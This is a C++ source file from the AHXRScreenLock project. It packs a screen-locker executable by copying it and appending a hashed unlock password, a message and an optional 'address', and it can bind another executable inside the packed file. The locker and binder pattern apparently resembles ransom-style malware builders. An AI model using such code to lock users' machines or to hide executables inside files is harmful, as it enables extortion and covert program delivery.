/*
	@title
		AHXRScreenLock
	@author
		AHXR (https://github.com/AHXR)
	@copyright
		2017

	AHXRScreenLock is free software: you can redistribute it and/or modify
	it under the terms of the GNU General Public License as published by
	the Free Software Foundation, either version 3 of the License, or
	(at your option) any later version.

	AHXRScreenLock is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU General Public License for more details.

	You should have received a copy of the GNU General Public License
	along with AHXRScreenLock.  If not, see <http://www.gnu.org/licenses/>.
*/
//=======================================================
#include					"debug.h"
#include					"sha256.h"
#include					"read_settings.h"
#include					"settings.h"

#include					<string>
#include					<fstream>

void packLocker(std::string fileName, std::string password, std::string message) {
	std::ifstream
		f_old;
	std::ofstream
		f_new;

	remove(DUMMY_FILE);

	f_old.open(DUMMY_STUDIO_THIS_EXE, std::ios::binary);
	f_new.open(DUMMY_FILE, std::ios::binary);

	f_new << f_old.rdbuf();

	f_old.close();
	f_new.close();

	std::fstream
		f_file;

	f_file.open(DUMMY_FILE, std::fstream::app);

	f_file << "----";
	f_file << PACK_OPENER << sha256(password) << PACK_CLOSER;
	f_file << PACK_OPENER << message << PACK_CLOSER;
	f_file << PACK_OPENER << "0" << PACK_CLOSER;

	f_file.close();
}

void packLocker(std::string fileName, std::string password, std::string message, std::string address) {
	std::ifstream
		f_old;
	std::ofstream
		f_new;

	remove(DUMMY_FILE);

	f_old.open(DUMMY_STUDIO_THIS_EXE, std::ios::binary);
	f_new.open(DUMMY_FILE, std::ios::binary);

	f_new << f_old.rdbuf();

	f_old.close();
	f_new.close();

	std::fstream
		f_file;

	f_file.open(DUMMY_FILE, std::fstream::app);

	f_file << "----";
	f_file << PACK_OPENER << sha256(password) << PACK_CLOSER;
	f_file << PACK_OPENER << message << PACK_CLOSER;
	f_file << PACK_OPENER << address << PACK_CLOSER;

	f_file.close();
}

void attachExecutable(std::string packedFile, std::string exePath) {
	std::fstream
		f_exe;
	std::fstream
		f_write;

	// Opening the attached exe and the packed locker file.
	f_exe.open(exePath, std::fstream::in | std::fstream::binary);
	f_write.open(packedFile, std::fstream::app | std::fstream::binary);

	// Creating brackets and writing the exe into the packed file.
	f_write << PACK_OPENER;
	f_write << f_exe.rdbuf();
	f_write << PACK_CLOSER;

	f_exe.close();
	f_write.close();
}